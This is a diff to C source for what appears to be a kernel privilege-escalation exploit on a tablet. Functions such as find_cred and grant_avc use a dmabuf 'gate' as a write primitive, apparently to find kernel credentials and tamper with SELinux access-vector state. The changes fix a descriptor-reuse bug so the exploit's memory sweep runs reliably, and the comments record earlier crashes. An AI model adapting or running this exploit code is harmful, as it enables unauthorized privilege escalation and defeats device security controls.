@@ -226,7 +226,52 @@ static int cmd_validate(void)
     u32 after = *(u32 *)(pg + PGSZ + 4);
     say("word at +4: 0x%08x (want 0x%08x)\n", after, iova);
 
-    int ok = (r_zero == -1 && r_alpha == 0 && after == iova);
+    /* The second gate, and the one the AVC sweep depends on for its safety.
+     *
+     * grant_avc narrows to a single buffer at fd 4 and then treats "the gate
+     * passed" as "the word was the capability class". That only holds if fd 4
+     * is the dmabuf and nothing else in the table is. Measured in src/tools/
+     * gtest.c on the BS: with fd 4 free the gate rejects the word 4, and with
+     * fd 4 holding the buffer it passes and stores that buffer's IOVA at +4.
+     *
+     * This check paid for itself immediately. The fresh allocation below came
+     * back as fd 4 itself, because 4 was the lowest free number after the
+     * alphabet buffer moved to 192. dup2(4, 4) is a no-op that returns 4, and
+     * the close() after it then freed the very descriptor the narrowing needs.
+     * The gate said so: "gate(word=4) rc=-1 ... VALIDATE FAIL".
+     *
+     * Had that happened inside grant_avc, the sweep would have run with fd 4
+     * empty. A passing gate would then have meant "the word is any small
+     * number", the code would have stored into every such word, and that is
+     * exactly the write that rebooted the tablet during the USB-only work.
+     *
+     * So the close is conditional, and the result is verified rather than
+     * assumed. */
+    int cfd; u32 ciova;
+    if (!mk_buf(&cfd, &ciova)) { say("class buffer errno=%d\n", errno); return 1; }
+    if (cfd != CLASS_FD) {
+        if (dup2(cfd, CLASS_FD) < 0) { say("dup2(%d) errno=%d\n", CLASS_FD, errno); return 1; }
+        close(cfd);
+    } else {
+        say("class buffer already at fd %d; no dup needed\n", CLASS_FD);
+    }
+
+    *(u32 *)(pg + 2 * PGSZ) = CLASS_FD;
+    *(u32 *)(pg + 2 * PGSZ + 4) = 0xdeadbeef;
+    errno = 0;
+    int r_cls = gate((u64)(uintptr_t)(pg + 2 * PGSZ));
+    say("gate(word=%d)   rc=%d errno=%d  want 0   (class gate)\n", CLASS_FD, r_cls, errno);
+    u32 cafter = *(u32 *)(pg + 2 * PGSZ + 4);
+    say("word at +4: 0x%08x (want 0x%08x)\n", cafter, ciova);
+
+    /* and a word that is not an open dmabuf must still be rejected */
+    *(u32 *)(pg + 2 * PGSZ) = 100000;
+    errno = 0;
+    int r_no = gate((u64)(uintptr_t)(pg + 2 * PGSZ));
+    say("gate(word=100000) rc=%d errno=%d  want -1  (not an fd)\n", r_no, errno);
+
+    int ok = (r_zero == -1 && r_alpha == 0 && after == iova &&
+              r_cls == 0 && cafter == ciova && r_no == -1);
     say("VALIDATE %s\n", ok ? "PASS" : "FAIL");
     return ok ? 0 : 1;
 }
@@ -247,8 +292,14 @@ static u64 find_cred(u32 lo, u32 hi, int page_window, long find_budget)
     }
     if (carrier < 0) { say("no buffer with bit 16 after %d allocations\n", nhold); return 0; }
     for (int i = 0; i < nhold; i++) close(hold[i]);
-    if (dup2(carrier, ALPHA_FD) < 0) { say("dup2(%d) errno=%d\n", ALPHA_FD, errno); return 0; }
-    close(carrier);
+    /* Same trap as CLASS_FD: if the carrier already sits on ALPHA_FD, dup2 is a
+     * no-op and closing the original frees the slot the sweep needs. */
+    if (carrier != ALPHA_FD) {
+        if (dup2(carrier, ALPHA_FD) < 0) { say("dup2(%d) errno=%d\n", ALPHA_FD, errno); return 0; }
+        close(carrier);
+    } else {
+        say("carrier already at fd %d; keeping it open\n", ALPHA_FD);
+    }
     say("carrier fd=%d iova=0x%08x. alphabet is one value.\n", ALPHA_FD, carrier_iova);
 
     int nul = quiet_zero_on_stdin();
@@ -364,8 +415,31 @@ static int grant_avc(u32 lo, u32 hi, int page_window, long max_stores, u64 cred)
     }
     if (cls < 0) { say("no buffer with bit 16 for fd 4\n"); return 0; }
     for (int i = 0; i < ntmp; i++) close(tmp[i]);
-    if (dup2(cls, CLASS_FD) < 0) { say("dup2(4) errno=%d\n", errno); close(cls); return 0; }
-    close(cls);
+    /* dup2(x, x) returns x, and the close after it then frees CLASS_FD. The
+     * fresh allocation can land on 4 itself, because 4 is the lowest number free
+     * once ALPHA_FD has just been released. Measured in cmd_validate: the naive
+     * form left fd 4 empty and the gate rejected the word 4, which here would
+     * mean the sweep ran with no class buffer and stored into every word that
+     * happened to be a small number. */
+    if (cls == CLASS_FD) {
+        say("class buffer arrived at fd %d already; keeping it open\n", CLASS_FD);
+    } else {
+        if (dup2(cls, CLASS_FD) < 0) { say("dup2(%d) errno=%d\n", CLASS_FD, errno); close(cls); return 0; }
+        close(cls);
+        /* the narrowing is what makes a passing gate mean "the word is 4" */
+        char chk[16] = {0};
+        u32 clsval = CLASS_FD;
+        memcpy(chk, &clsval, 4);
+        u8 *pg = mmap(NULL, PGSZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+        if (pg != MAP_FAILED) {
+            *(u32 *)pg = CLASS_FD;
+            int g = gate((u64)(uintptr_t)pg);
+            munmap(pg, PGSZ);
+            if (g != 0) { say("class gate FAILED after dup; refusing to sweep\n"); close(CLASS_FD); return 0; }
+            say("class gate verified: the word %d passes\n", CLASS_FD);
+        }
+        (void)chk;
+    }
     say("class fd=%d iova=0x%08x; only the word 4 passes now\n", CLASS_FD, (int)iv);
 
     long probes = 0, stores = 0;
